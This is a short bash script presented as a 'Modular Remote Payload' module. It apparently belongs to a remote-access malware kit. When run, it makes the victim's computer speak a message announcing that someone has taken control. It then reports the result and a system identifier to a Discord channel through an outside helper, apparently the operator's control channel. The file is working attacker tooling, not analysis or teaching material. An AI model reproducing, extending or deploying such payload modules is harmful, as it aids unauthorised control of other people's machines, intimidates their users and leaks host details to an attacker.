#!/bin/bash
# ============================================================
# Text to Speech for Linux - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)

MESSAGE="${MSG:-Hello, I have taken control of your computer. This is a security test.}"

# Try different TTS tools
if command -v espeak &>/dev/null; then
    espeak "$MESSAGE" 2>/dev/null
elif command -v espeak-ng &>/dev/null; then
    espeak-ng "$MESSAGE" 2>/dev/null
elif command -v spd-say &>/dev/null; then
    spd-say "$MESSAGE" 2>/dev/null
elif command -v festival &>/dev/null; then
    echo "$MESSAGE" | festival --tts 2>/dev/null
else
    send_discord "❌ No TTS tool available on $SYSID"
    exit 1
fi

send_discord "🔊 **TTS Executed on $SYSID**\nMessage: \`$MESSAGE\`"

